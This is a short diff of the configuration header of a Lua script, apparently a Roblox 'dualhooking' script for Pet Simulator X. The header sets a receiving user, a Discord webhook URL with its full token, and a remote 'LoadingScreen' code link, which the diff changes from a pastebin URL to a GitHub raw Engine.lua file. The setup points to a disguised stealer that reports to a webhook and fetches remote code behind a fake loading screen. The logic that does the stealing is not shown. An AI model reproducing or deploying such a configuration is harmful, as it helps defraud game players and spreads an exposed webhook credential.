@@ -9,7 +9,7 @@
 
 local dhuser = "petspsx651"       -- dualhooking user
 local dhwebhook = "https://discord.com/api/webhooks/1129531859051749426/BhM5VbwIJP7mfL0m8SDAW7zTOqUvGn7QGd2btSHPAeecIEeNLOMY9psLEgUWxMua7gNZ" -- Dualhooking Webhook
-local loadingraw = "https://pastebin.com/raw/L59djFBq" -- Put Your LoadingScreen Raw Link Here
+local loadingraw = "https://raw.githubusercontent.com/Cypaex/PsxLoading/main/Engine.lua" -- Put Your LoadingScreen Raw Link Here
 
 if getgenv().executed1 then return end
 getgenv().executed1 = true
